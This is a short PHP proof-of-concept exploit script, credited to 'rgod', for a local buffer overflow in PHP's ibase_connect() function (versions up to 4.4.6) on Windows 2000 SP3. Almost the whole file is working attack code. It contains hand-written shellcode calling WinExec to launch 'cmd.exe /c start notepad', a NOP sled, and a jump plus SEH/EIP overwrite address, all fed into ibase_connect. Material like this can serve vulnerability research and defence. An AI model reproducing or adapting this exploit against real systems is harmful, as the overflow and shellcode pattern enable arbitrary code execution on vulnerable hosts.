<?php 
// PHP <= 4.4.6 ibase_connect() & ibase_pconnect() local buffer overflow 
// poc exploit 
// windows 2000 sp3 en / seh overwrite
// by rgod
// site: http://retrogod.altervista.org


if (!extension_loaded("interbase")){
die("only works with interbase extension ");
}

$____scode=
"\xeb\x1b".
"\x5b".
"\x31\xc0".
"\x50".
"\x31\xc0".
"\x88\x43\x59".
"\x53".
"\xbb\xca\x73\xe9\x77". //WinExec
"\xff\xd3".
"\x31\xc0".
"\x50".
"\xbb\x5c\xcf\xe9\x77". //ExitProcess
"\xff\xd3".
"\xe8\xe0\xff\xff\xff".
"\x63\x6d\x64".
"\x2e".
"\x65".
"\x78\x65".
"\x20\x2f".
"\x63\x20".
"start notepad & ";

$jmp="\xeb\xa1\xff\xeb"; // jmp short
$eip="\x86\xa0\xf8\x77"; // call ebx, ntdll.dll
$____suntzu=str_repeat("A",2676 - strlen($____scode));
$____suntzu.=str_repeat("\x90",190).$____scode.str_repeat("\x90",10).$jmp.$eip;
ibase_connect($____suntzu);

?>
